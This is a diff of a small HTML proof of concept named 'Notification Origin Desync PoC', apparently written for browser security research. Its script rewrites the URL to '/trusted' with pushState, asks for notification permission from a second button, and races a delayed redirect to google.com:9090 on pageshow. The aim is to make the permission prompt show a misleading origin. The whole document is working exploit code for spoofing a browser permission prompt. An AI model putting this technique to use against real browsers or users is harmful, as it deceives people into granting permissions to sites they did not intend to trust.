@@ -1,53 +1,19 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Notification Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body {
-  margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,system-ui;
-  background:#f5f5f7;
-  text-align:center;
-}
-button {
-  margin-top:80px;
-  font-size:16px;
-  padding:12px 16px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:#fff;
-}
-</style>
-</head>
-<body>
-
-<button id="start">Request Notification</button>
+<button id="start">Start PoC</button>
+<button id="req" hidden>Request Notification</button>
 
 <script>
-const start = document.getElementById('start');
-
-start.onclick = async () => {
-  // Step 1: make URL look trusted
+start.onclick = () => {
   history.pushState({}, '', '/trusted');
-
-  // Step 2: request notification permission
-  Notification.requestPermission().then(r => {
-    console.log('Permission:', r);
-  });
+  req.hidden = false;
 };
 
-// Step 3: navigation race
+req.onclick = () => {
+  Notification.requestPermission();
+};
+
 window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    setTimeout(() => {
-      location.href = 'https://google.com:9090';
-    }, 80);
-  });
+  setTimeout(() => {
+    location.href = 'https://google.com:9090';
+  }, 80);
 });
 </script>
-
-</body>
-</html>
